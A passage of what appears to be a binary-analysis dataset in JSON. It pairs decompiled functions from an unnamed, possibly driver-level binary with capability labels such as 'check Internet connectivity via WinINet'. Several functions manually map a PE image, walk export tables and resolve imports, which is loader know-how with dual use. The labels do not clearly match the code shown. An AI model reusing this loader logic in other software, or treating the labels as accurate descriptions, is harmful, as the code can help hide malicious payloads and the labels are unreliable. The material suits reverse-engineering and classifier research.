        "decompiled_code": "\nvoid fcn.00048dd4(void)\n\n{\n    uint8_t uVar1;\n    uint64_t uVar2;\n    code **ppcVar3;\n    int64_t *piVar4;\n    uint32_t uVar5;\n    int64_t *piVar6;\n    \n    if (*0x87978 != '\\0') {\n        *0x87978 = '\\0';\n        *0x87938 = 1;\n        fcn.0002ee20(0x87958);\n        uVar2 = 0;\n        fcn.00031648(0x87948, 0);\n        fcn.00031624(0x87948);\n        fcn.0002edfc(0x87958);\n        uVar5 = 0;\n        ppcVar3 = 0x66388;\n        do {\n            if (*(ppcVar3 + -0x44) != 0) {\n                uVar2 = 0;\n                (**ppcVar3)(uVar5, 1);\n            }\n            uVar5 = uVar5 + 1;\n            ppcVar3 = ppcVar3 + 0xc;\n        } while (uVar5 < 4);\n        fcn.0002f214(0x87960);\n        uVar1 = (**0x113d0)(0x87940);\n        piVar6 = 0x64;\n        piVar4 = *0x87970;\n        do {\n            if (*piVar4 != 0) {\n                fcn.0002fc50(*piVar4);\n            }\n            piVar4 = piVar4 + 4;\n            piVar6 = piVar6 + -1;\n        } while (piVar6 != NULL);\n        (**0x113c0)(0x87940, uVar2 & 0xffffffffffffff00 | uVar1);\n        fcn.0002fc50(*0x87970);\n        *0x87970 = piVar6;\n    }\n    return;\n}\n",
        "token_count": 436
    },
    "00048fac": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00048fac(ulong arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    if (*0x87978 == '\\0') {\n        uVar1 = 0x21590006;\n    }\n    else {\n        fcn.0002f23c(0x87960);\n        iVar2 = arg1 * 0x60;\n        if (*(iVar2 + 0x66344) != 0) {\n            fcn.0002fe58();\n            if (arg2 == 0) {\n                fcn.00026ad8(*(iVar2 + 0x66340), 0);\n            }\n            *(iVar2 + 0x66344) = 0;\n        }\n        fcn.0002f2a4(0x87960);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 197
    },
    "00049040": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00049040(ulong arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    int64_t *piVar3;\n    uint32_t uVar4;\n    int32_t in_stack_00000028;\n    int64_t iStack104;\n    uint32_t uStack96;\n    ulong uStack88;\n    \n    if (*(in_stack_00000028 * 0x60 + 0x66344) != 0) {\n        uStack96 = arg4 + arg2;\n        uStack88 = *0xfffff78000000014;\n        iVar2 = fcn.0002fbf0(uStack96);\n        if (iVar2 == 0) {\n            LOCK();\n            piVar3 = in_stack_00000028 * 0x60 + 0x66368;\n            *piVar3 = *piVar3 + 1;\n        }\n        else {\n            iStack104 = iVar2;\n            fcn.000619f6(iVar2, arg1, arg2);\n            fcn.000619f6(arg2 + iVar2, arg3, arg4);\n            uVar1 = (**0x113d0)();\n            piVar3 = ((*0x87968 + 1) / 100) * 100;\n            uVar4 = (*0x87968 + 1) % 100;\n            if (uVar4 == *0x8796c) {\n                if (in_stack_00000028 == 0) {\n                    LOCK();\n                    *0x66368 = *0x66368 + 1;\n                }\n            }\n            else {\n                piVar3 = &iStack104;\n                fcn.000619f6(*0x87968 * 0x20 + *0x87970, piVar3, 0x20);\n                *0x87968 = uVar4;\n            }\n            (**0x113c0)(0x87940, piVar3 & 0xffffffffffffff00 | uVar1);\n            fcn.0002ee20(0x87958);\n        }\n    }\n    return;\n}\n",
        "token_count": 473
    },
    "000494d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nulong fcn.000494d0(ulong noname_0, ulong noname_1, ulong arg3, uint *arg4)\n\n{\n    int32_t iVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    bool bVar5;\n    uint32_t auStackX32 [2];\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    uint uStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack220;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uint uStack200;\n    uint uStack196;\n    uint *puStack192;\n    uint auStack184 [2];\n    uint *puStack176;\n    uint uStack168;\n    uint **ppuStack160;\n    uint auStack152 [2];\n    uint *puStack144;\n    uint auStack136 [2];\n    uint uStack128;\n    uint *puStack120;\n    uint auStack112 [2];\n    uint uStack104;\n    uint *puStack96;\n    uint auStack88 [2];\n    uint uStack80;\n    uint *puStack72;\n    uint auStack64 [2];\n    uint uStack56;\n    uint *puStack48;\n    uint auStack40 [4];\n    ulong var_1h;\n    \n    bVar5 = *0x87978 == '\\0';\n    *arg4 = 0;\n    if (bVar5) {\n        uVar2 = 0x21590006;\n    }\n    else {\n        iVar1 = fcn.0001fa4c(arg3, 0x58, 3, auStackX32);\n        *arg4 = 3;\n        uVar4 = -(iVar1 != 0) & auStackX32[0];\n        auStackX32[0] = uVar4;\n        fcn.00061a56(auStack184, 0, 0x20);\n        puStack176 = &uStack232;\n        auStack184[0] = 5;\n        fcn.00061a56(&uStack232, 0, 0x28);\n        uStack228 = 2;\n        uStack220 = 2;\n        uStack212 = 2;\n        uStack204 = 2;\n        uStack196 = 2;\n        puStack192 = auStack152;\n        ppuStack160 = &puStack192;\n        uStack232 = 0x2a;\n        uStack224 = 0x2b;\n        uStack216 = 0x2c;\n        uStack208 = 0x2d;\n        uStack200 = 0x2e;\n        uStack168 = 1;\n        fcn.00061a56(auStack152, 0, 0x78);\n        puStack144 = auStack136;\n        auStack152[0] = 4;\n        uStack128 = 4;\n        iVar3 = uVar4 * 0x60;\n        uStack104 = 4;\n        auStack136[0] = *(iVar3 + 0x66358);\n        uStack80 = 4;\n        uStack56 = 4;\n        puStack120 = auStack112;\n        auStack112[0] = *(iVar3 + 0x66360);\n        puStack96 = auStack88;\n        auStack88[0] = *(iVar3 + 0x66368);\n        puStack72 = auStack64;\n        auStack64[0] = *(iVar3 + 0x66370);\n        puStack48 = auStack40;\n        auStack40[0] = *(iVar3 + 0x66378);\n        uVar2 = fcn.0002ae80(auStack184, in_stack_00000028, in_stack_00000030);\n    }\n    return uVar2;\n}\n",
        "token_count": 876
    },
    "000499b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.000499b8(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    \n    if (*0x87978 == '\\0') {\n        fcn.0002f1ec(0x87960);\n        iVar1 = fcn.0002ed80(0x87958);\n        if (iVar1 == 0) {\n            iVar1 = -1;\n        }\n        else {\n            *0x87940 = 0;\n            *0x87970 = fcn.0002fbf0(0xc80);\n            if (*0x87970 == 0) {\n                iVar1 = 0x21590004;\n            }\n            else {\n                fcn.00061a56(*0x87970, 0);\n                *0x87968 = 0;\n                *0x8796c = 0;\n                iVar1 = fcn.0001a650(0x87948, 0x4919c, 0);\n                if (iVar1 == 0) {\n                    *0x87978 = '\\x01';\n                    iVar1 = 0;\n                }\n                else {\n                    *0x87978 = '\\0';\n                    iVar1 = fcn.0002fde4();\n                }\n                uVar4 = 0;\n                piVar3 = 0x6634c;\n                do {\n                    iVar2 = fcn.00026a7c(piVar3[-1], 0);\n                    *piVar3 = iVar2;\n                    if (iVar2 == 0) {\n                        *piVar3 = -1;\n                    }\n                    iVar2 = fcn.00026a7c(piVar3[1], 0);\n                    piVar3[2] = iVar2;\n                    if (iVar2 == 0) {\n                        piVar3[2] = -1;\n                    }\n                    iVar2 = fcn.00026a7c(piVar3[-3], 0);\n                    if (iVar2 != 0) {\n                        (**(piVar3 + 0xd))();\n                    }\n                    uVar4 = uVar4 + 1;\n                    piVar3 = piVar3 + 0x18;\n                } while (uVar4 < 4);\n                if (iVar1 == 0) {\n                    return 0;\n                }\n            }\n            fcn.0002f214(0x87960);\n            fcn.0002edfc(0x87958);\n            fcn.0002fc50(*0x87970);\n            *0x87970 = 0;\n        }\n    }\n    else {\n        iVar1 = 0x21590006;\n    }\n    return iVar1;\n}\n",
        "token_count": 601
    },
    "00049b14": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00049b14(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    if (*0x87978 != '\\0') {\n        fcn.00049040(0, 0, arg2, arg3);\n    }\n    return;\n}\n",
        "token_count": 60
    },
    "00049c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00049c10(ulong noname_0, ulong arg2, int64_t arg3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *apuStackX24 [2];\n    uint auStack136 [2];\n    ulong uStack128;\n    ulong uStack120;\n    uint uStack112;\n    ulong uStack104;\n    ulong uStack96;\n    uchar auStack88 [32];\n    int64_t iStack56;\n    \n    apuStackX24[0] = NULL;\n    if (arg3 == 0) {\n        uVar2 = 0x21590065;\n    }\n    else {\n        iVar1 = fcn.00061a92(noname_0, 0, auStack88, 0x30, 0);\n        if (iVar1 == 0) {\n            uVar2 = fcn.0002f490(5, apuStackX24);\n            if (uVar2 == 0) {\n                uVar2 = 0x21590005;\n                puVar3 = apuStackX24[0];\n                if (apuStackX24[0] == NULL) {\n                    return 0x21590005;\n                }\n                while ((*(puVar3 + 0x14) != iStack56 || (puVar3[1] == 0))) {\n                    if ((*puVar3 == 0) || (puVar3 = puVar3 + *puVar3,  puVar3 == NULL)) goto code_r0x00049d1b;\n                }\n                auStack136[0] = 0x30;\n                uStack128 = 0;\n                uStack112 = 0;\n                uStack120 = 0;\n                uStack104 = 0;\n                uStack96 = 0;\n                iVar1 = fcn.00061bd6(arg3, arg2, auStack136, puVar3 + 0x4a);\n                uVar2 = -(iVar1 != 0) & 0x21590008;\n            }\n        }\n        else {\n            uVar2 = 0x21590008;\n        }\ncode_r0x00049d1b:\n        if (apuStackX24[0] != NULL) {\n            fcn.0002fc50(apuStackX24[0]);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 536
    },
    "00049d34": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.00049d34(ulong noname_0, uchar *arg2)\n\n{\n    ulong uVar1;\n    int64_t aiStackX24 [2];\n    \n    uVar1 = fcn.00061a92(noname_0, 0x1a, aiStackX24, 8, 0);\n    if (uVar1 == -0x3ffffffd) {\n        *arg2 = 0;\n    }\n    else {\n        if (uVar1 != 0) {\n            return uVar1;\n        }\n        *arg2 = aiStackX24[0] != 0;\n    }\n    return 0;\n}\n",
        "token_count": 145
    },
    "0004a25c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.0004a25c(int64_t arg1, int64_t arg2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t *puVar4;\n    uint32_t uVar5;\n    \n    iVar3 = *(arg2 + 0x3c) + arg2;\n    uVar1 = *(iVar3 + 0x38);\n    fcn.0002f7d0(arg1, arg2, *(iVar3 + 0x54));\n    uVar5 = 0;\n    if (*(iVar3 + 6) != 0) {\n        puVar4 = *(iVar3 + 0x14) + 0x28 + iVar3;\n        do {\n            if (*puVar4 != 0) {\n                uVar2 = puVar4[-1];\n                if (uVar2 % uVar1 != 0) {\n                    uVar2 = (uVar2 / uVar1 + 1) * uVar1;\n                }\n                fcn.0002f7d0(uVar2 + arg1, puVar4[1] + arg2, *puVar4);\n            }\n            uVar5 = uVar5 + 1;\n            puVar4 = puVar4 + 10;\n        } while (uVar5 < *(iVar3 + 6));\n    }\n    return 0;\n}\n",
        "token_count": 311
    },
    "0004afbc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0004afbc(int64_t arg1, char *arg2, int64_t *arg3)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    int64_t iVar5;\n    uint32_t *puVar6;\n    int64_t iVar7;\n    uint16_t uVar8;\n    char *pcVar9;\n    uint32_t uVar10;\n    uint16_t *puVar11;\n    uint32_t *puVar12;\n    int64_t iVar13;\n    uint32_t uVar14;\n    uint32_t uStackX8;\n    \n    if (arg1 == 0) {\n        uVar4 = 0x21590066;\n    }\n    else if (arg2 == NULL) {\n        uVar4 = 0x21590067;\n    }\n    else if (arg3 == NULL) {\n        uVar4 = 0x21590068;\n    }\n    else {\n        iVar5 = *(arg1 + 0x3c) + arg1;\n        if (*(iVar5 + 0x18) == 0x10b) {\n            puVar6 = iVar5 + 0x78;\n        }\n        else {\n            puVar6 = iVar5 + 0x88;\n        }\n        uVar2 = *puVar6;\n        if (uVar2 != 0) {\n            iVar5 = arg1 + uVar2;\n            iVar13 = *(iVar5 + 0x1c) + arg1;\n            puVar11 = *(iVar5 + 0x24) + arg1;\n            puVar12 = *(iVar5 + 0x20) + arg1;\n            if ((arg2 & 0xffffffffffff0000) != 0) {\n                iVar7 = -1;\n                uStackX8 = 0;\n                pcVar9 = arg2;\n                do {\n                    if (iVar7 == 0) break;\n                    iVar7 = iVar7 + -1;\n                    cVar1 = *pcVar9;\n                    pcVar9 = pcVar9 + 1;\n                } while (cVar1 != '\\0');\n                uVar14 = ~iVar7 - 1;\n                if (*(iVar5 + 0x18) == 0) {\n                    return 0x21590005;\n                }\n                do {\n                    uVar3 = *(iVar13 + *puVar11 * 4);\n                    if ((uVar14 < (puVar6[1] + uVar2) - *puVar12) && (*(uVar14 + *puVar12 + arg1) == '\\0')) {\n                        uVar10 = 0;\n                        if (uVar14 == 0) goto joined_r0x0004b131;\n                        pcVar9 = arg2;\n                        do {\n                            if (pcVar9[(*puVar12 + arg1) - arg2] != *pcVar9) break;\n                            uVar10 = uVar10 + 1;\n                            pcVar9 = pcVar9 + 1;\n                        } while (uVar10 < uVar14);\n                        if (uVar14 <= uVar10) goto joined_r0x0004b131;\n                    }\n                    uStackX8 = uStackX8 + 1;\n                    puVar11 = puVar11 + 1;\n                    puVar12 = puVar12 + 1;\n                    if (*(iVar5 + 0x18) <= uStackX8) {\n                        return 0x21590005;\n                    }\n                } while( true );\n            }\n            uVar8 = arg2 - *(iVar5 + 0x10);\n            if (uVar8 < *(iVar5 + 0x14) || uVar8 == *(iVar5 + 0x14)) {\n                uVar3 = *(iVar13 + uVar8 * 4);\njoined_r0x0004b131:\n                if ((uVar2 <= uVar3) && (uVar3 < puVar6[1] + uVar2)) {\n                    uVar4 = fcn.0004a668(uVar3 + arg1, arg3);\n                    return uVar4;\n                }\n                *arg3 = arg1 + uVar3;\n                return 0;\n            }\n        }\n        uVar4 = 0x21590005;\n    }\n    return uVar4;\n}\n",
        "token_count": 952
    },
    "0004b1dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004b1dc(ulong arg1, uint32_t *arg2)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    int64_t arg3;\n    int64_t iVar3;\n    uint64_t uVar4;\n    int64_t iVar5;\n    uint64_t uVar6;\n    uint64_t uVar7;\n    int64_t arg1_00;\n    uint64_t *puVar8;\n    uint32_t *puVar9;\n    ulong *puVar10;\n    uint64_t uVar11;\n    uint64_t *puVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    int64_t iStackX24;\n    uint64_t uStackX32;\n    int64_t iStack120;\n    int64_t iStack96;\n    \n    iStack120 = 0;\n    uStackX32 = 0;\n    iStackX24 = 0;\n    uVar13 = 0;\n    iVar5 = 0;\n    arg3 = fcn.0002fbc4(0x148);\n    if (arg3 == 0) {\n        iVar2 = 0x21590004;\n    }\n    else {\n        iVar2 = fcn.00049f40(&iStackX24, 0x10, arg1);\n        arg1_00 = iVar5;\n        if (iVar2 == 0) {\n            iVar3 = arg2[0xf] + arg2;\n            if (*(iVar3 + 0x18) == 0x10b) {\n                uVar14 = *(iVar3 + 0x80);\n                uVar4 = 0x80000000;\n                iStack120 = iVar3;\n            }\n            else {\n                uVar14 = *(iVar3 + 0x90);\n                uVar4 = 0x8000000000000000;\n            }\n            puVar9 = uVar14 + arg2;\n            uVar14 = uVar13;\n            if ((puVar9 != arg2) && (uVar14 = 0,  puVar9[3] != 0)) {\n                iStack96 = -8;\n                do {\n                    uVar14 = uVar13 + 1;\n                    uVar6 = uVar13 * 8;\n                    uVar7 = uVar14 << 3;\n                    if (uVar14 == 0) {\n                        fcn.0002fc50(arg1_00);\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar5 = fcn.0002fbc4(uVar7);\n                        if (iVar5 == 0) {\n                            iVar2 = 0x21590004;\n                            goto code_r0x0004b53d;\n                        }\n                        uVar11 = uVar6;\n                        if (uVar7 < uVar6) {\n                            uVar11 = uVar7;\n                        }\n                        fcn.000619f6(iVar5, arg1_00, uVar11);\n                        fcn.0002fc50(arg1_00);\n                    }\n                    if (arg1 == 0) {\n                        iVar2 = fcn.0002f96c(puVar9[3] + arg2, uVar6 + iVar5);\n                    }\n                    else {\n                        iVar2 = fcn.0004a6f4(arg1, puVar9[3] + arg2, uVar6 + iVar5);\n                    }\n                    arg1_00 = iVar5;\n                    if (iVar2 != 0) goto code_r0x0004b53d;\n                    iStack96 = iStack96 + 8;\n                    uVar13 = uVar14;\n                    if (iStackX24 == 0) {\n                        fcn.000619f6(arg3, *(iStack96 + iVar5), 0x40);\n                    }\n                    else {\n                        iVar2 = fcn.0002fb84(iStackX24, *(iStack96 + iVar5), arg3);\n                        if (iVar2 != 0) goto code_r0x0004b53d;\n                    }\n                    iVar3 = *(arg3 + 0x3c) + *(iStack96 + iVar5);\n                    if (iStackX24 == 0) {\n                        fcn.000619f6(arg3 + 0x40, iVar3, 0xf8);\n                    }\n                    else {\n                        iVar2 = fcn.0002fb84(iStackX24, iVar3, arg3 + 0x40);\n                        if (iVar2 != 0) goto code_r0x0004b53d;\n                    }\n                    if (*(arg3 + 0x58) != 0x10b) {\n                        iVar3 = *(arg3 + 0x3c) + *(iStack96 + iVar5);\n                        if (iStackX24 == 0) {\n                            fcn.000619f6(arg3 + 0x40, iVar3, 0x108);\n                        }\n                        else {\n                            iVar2 = fcn.0002fb84(iStackX24, iVar3, arg3 + 0x40);\n                            if (iVar2 != 0) goto code_r0x0004b53d;\n                        }\n                    }\n                    puVar12 = puVar9[4] + arg2;\n                    puVar8 = puVar12;\n                    if (*puVar9 != 0) {\n                        puVar8 = *puVar9 + arg2;\n                    }\n                    if (iStack120 == 0) {\n                        uVar6 = *puVar8;\n                    }\n                    else {\n                        uVar6 = *puVar8;\n                    }\n                    while (uVar6 != 0) {\n                        uVar7 = uVar6 & 0xffff;\n                        if ((uVar4 & uVar6) == 0) {\n                            uVar7 = uVar6 + 2 + arg2;\n                        }\n                        if (arg1 == 0) {\n                            iVar2 = fcn.0004afbc(*(iStack96 + iVar5), uVar7, &uStackX32);\n                        }\n                        else {\n                            iVar2 = fcn.0004e25c(iStackX24, arg3 + 0x40, *(iStack96 + iVar5), arg1);\n                        }\n                        if (iVar2 != 0) goto code_r0x0004b53d;\n                        if (iStack120 == 0) {\n                            *puVar12 = uStackX32;\n                            puVar12 = puVar12 + 1;\n                            puVar8 = puVar8 + 1;\n                            uVar6 = *puVar8;\n                        }\n                        else {\n                            *puVar12 = uStackX32;\n                            puVar12 = puVar12 + 4;\n                            puVar8 = puVar8 + 4;\n                            uVar6 = *puVar8;\n                        }\n                    }\n                    puVar1 = puVar9 + 8;\n                    puVar9 = puVar9 + 5;\n                } while (*puVar1 != 0);\n            }\n            iVar2 = 0;\n            arg1_00 = iVar5;\n            uVar13 = uVar14;\n        }\ncode_r0x0004b53d:\n        fcn.000619de();\n        if ((((iVar2 != 0) && (arg1_00 != 0)) && (arg1 != 0)) && (uVar13 != 0)) {\n            puVar10 = arg1_00 + -8 + uVar13 * 8;\n            do {\n                fcn.0004ee74(arg1, *puVar10);\n                puVar10 = puVar10 + -1;\n                uVar13 = uVar13 - 1;\n            } while (uVar13 != 0);\n        }\n        fcn.0002fc50(arg1_00);\n        fcn.0002fc50(arg3);\n    }\n    return iVar2;\n}\n",
        "token_count": 1734
    },
    "0004b5a8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.0004b5a8(ulong arg1, uint64_t arg2, int64_t *arg3)\n\n{\n    int32_t iVar1;\n    int64_t arg2_00;\n    uint64_t arg2_01;\n    uint64_t arg2_02;\n    uint32_t uStackX24;\n    uint uStackX28;\n    int64_t iStackX32;\n    int64_t iStack432;\n    uint32_t uStack420;\n    uchar auStack408 [8];\n    uchar auStack400 [8];\n    int32_t iStack392;\n    int32_t iStack388;\n    uint32_t uStack384;\n    int64_t iStack376;\n    int32_t iStack348;\n    int32_t iStack344;\n    uchar auStack296 [20];\n    uint32_t uStack276;\n    int64_t iStack272;\n    uchar auStack248 [16];\n    uchar auStack232 [16];\n    int64_t iStack216;\n    int64_t iStack208;\n    uint64_t uStack200;\n    int64_t iStack136;\n    int64_t iStack128;\n    \n    iStackX32 = 0;\n    if (arg3 == NULL) {\n        return 0x21590067;\n    }\n    *arg3 = 0;\n    iVar1 = fcn.00049f40(&iStackX32, 0x438, arg1);\n    if ((iVar1 == 0) && (iVar1 = fcn.00049d80(iStackX32, &uStackX24),  iVar1 == 0)) {\n        iVar1 = fcn.0004b164(iStackX32, &uStackX24);\n        if (iVar1 == 0) {\n            if (uStackX24 == '\\0') {\n                iVar1 = fcn.00049dcc(iStackX32, CONCAT44(uStackX28, uStackX24), auStack296, 0x20);\n                if (iVar1 != 0) goto code_r0x0004b94f;\n                if (iStack272 == 0) {\n                    iVar1 = -1;\n                    goto code_r0x0004b94f;\n                }\n                iVar1 = fcn.00049dcc(iStackX32, iStack272, auStack408, 0x40);\n                if (iVar1 != 0) goto code_r0x0004b94f;\n                do {\n                    if (iStack376 == iStack272 + 0x20) goto code_r0x0004b932;\n                    iVar1 = fcn.00049dcc(iStackX32, iStack376, &iStack432, 0x10);\n                    if (iVar1 != 0) goto code_r0x0004b94f;\n                    arg2_00 = iStack376 + -0x10;\n                    iVar1 = fcn.00049dcc(iStackX32, arg2_00, auStack248, 0x88);\n                    if (iVar1 != 0) goto code_r0x0004b94f;\n                    iStack376 = iStack432;\n                } while (uStack200 != arg2);\n                fcn.0004a958(iStackX32, auStack248);\n                fcn.0004a958(iStackX32, auStack232);\n                if ((iStack216 != 0) && (iStack208 != 0)) {\n                    fcn.0004a958(iStackX32, &iStack216);\n                }\n                if ((iStack128 != 0) && (iStack136 != 0)) {\n                    fcn.0004a958(iStackX32, &iStack136);\n                }\n                *arg3 = arg2_00;\n            }\n            else {\n                iVar1 = fcn.00049dcc(iStackX32, CONCAT44(uStackX28, uStackX24), &iStack432, 0x10);\n                if (iVar1 != 0) goto code_r0x0004b94f;\n                arg2_02 = uStack420;\n                if (arg2_02 == 0) {\n                    iVar1 = uStack420 - 1;\n                    goto code_r0x0004b94f;\n                }\n                iVar1 = fcn.00049dcc(iStackX32, arg2_02, auStack296, 0x24);\n                if (iVar1 != 0) goto code_r0x0004b94f;\n                do {\n                    arg2_01 = uStack276;\n                    if (arg2_01 == arg2_02 + 0x14) goto code_r0x0004b932;\n                    iVar1 = fcn.00049dcc(iStackX32, arg2_01, &uStackX24, 8);\n                    if (iVar1 != 0) goto code_r0x0004b94f;\n                    iVar1 = fcn.00049dcc(iStackX32, arg2_01 - 8, auStack408, 0x48);\n                    if (iVar1 != 0) goto code_r0x0004b94f;\n                    uStack276 = uStackX24;\n                } while (uStack384 != arg2);\n                fcn.0004aa70(iStackX32, auStack408);\n                fcn.0004aa70(iStackX32, auStack400);\n                if ((iStack392 != 0) && (iStack388 != 0)) {\n                    fcn.0004aa70(iStackX32, &iStack392);\n                }\n                if ((iStack344 != 0) && (iStack348 != 0)) {\n                    fcn.0004aa70(iStackX32, &iStack348);\n                }\n                *arg3 = arg2_01 - 8;\n            }\ncode_r0x0004b932:\n            iVar1 = (*arg3 != 0) - 1;\n        }\n    }\ncode_r0x0004b94f:\n    if (iStackX32 != 0) {\n        fcn.000619de();\n    }\n    return iVar1;\n}\n",
        "token_count": 1346
    },
    "0004ce28": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0004ce28(ulong arg1, int16_t *arg2, int64_t arg3, int64_t arg4)\n\n{\n    bool bVar1;\n    bool bVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int64_t iVar6;\n    uint64_t *arg2_00;\n    int64_t iVar7;\n    uint64_t *puVar8;\n    char acStackX16 [8];\n    int64_t iStackX24;\n    int64_t iStackX32;\n    uint64_t *in_stack_00000028;\n    uint64_t uStack328;\n    int64_t iStack320;\n    int64_t iStack312;\n    int64_t iStack304;\n    uint64_t uStack296;\n    uint64_t *puStack288;\n    int64_t iStack280;\n    uchar auStack272 [15];\n    uint32_t uStack257;\n    uint uStack181;\n    uint64_t uStack177;\n    uint uStack169;\n    uchar auStack104 [56];\n    \n    arg2_00 = NULL;\n    puVar8 = NULL;\n    puStack288 = NULL;\n    iStack312 = 0;\n    iStack320 = 0;\n    bVar1 = false;\n    bVar2 = false;\n    uStack328 = 0;\n    iStack304 = 0;\n    bVar3 = false;\n    if (arg2 == NULL) {\n        return 0x21590066;\n    }\n    iStackX24 = arg3;\n    iStackX32 = arg4;\n    iVar4 = fcn.00049f40(&iStack320, 0x438, arg1);\n    iVar6 = iStack312;\n    if (iVar4 == 0) {\n        if ((*arg2 == 0x5a4d) && (iVar7 = *(arg2 + 0x1e),  *(iVar7 + arg2) == 0x4550)) {\n            if (((*(iVar7 + 0x5c + arg2) == 1) && (arg1 != 0)) || ((*(iVar7 + 0x5c + arg2) != 1 && (arg1 == 0)))) {\n                iVar4 = 0x21590206;\n                bVar2 = false;\n            }\n            else {\n                iVar4 = fcn.00049d80(iStack320, acStackX16);\n                iVar6 = iStack312;\n                if (iVar4 == 0) {\n                    if (((acStackX16[0] == '\\0') || (*(iVar7 + 0x18 + arg2) != 0x20b)) &&\n                       ((acStackX16[0] != '\\0' || (*(iVar7 + 0x18 + arg2) != 0x10b)))) {\n                        uVar5 = fcn.0004a1ec(arg2);\n                        uStack296 = uVar5;\n                        iVar6 = fcn.0002fbc4(uStack296);\n                        iStack312 = iVar6;\n                        if (iVar6 == 0) {\n                            iVar4 = 0x21590004;\n                            bVar2 = false;\n                            arg2_00 = puVar8;\n                        }\n                        else {\n                            fcn.00061a56(iVar6, 0, uStack296);\n                            iVar4 = fcn.0004a25c(iVar6, arg2);\n                            if (iVar4 == 0) {\n                                if (iStack320 != 0) {\n                                    iVar4 = (*_fcn.00011138)(iStack320, 0, 0, 0, &iStack304, 0);\n                                    if (iVar4 < 0) {\n                                        bVar2 = false;\n                                        arg2_00 = puVar8;\n                                        goto code_r0x0004d32e;\n                                    }\n                                    iVar7 = (*_fcn.000113b8)();\n                                    if (iStack304 != iVar7) {\n                                        (**0x113b0)(iStack304, 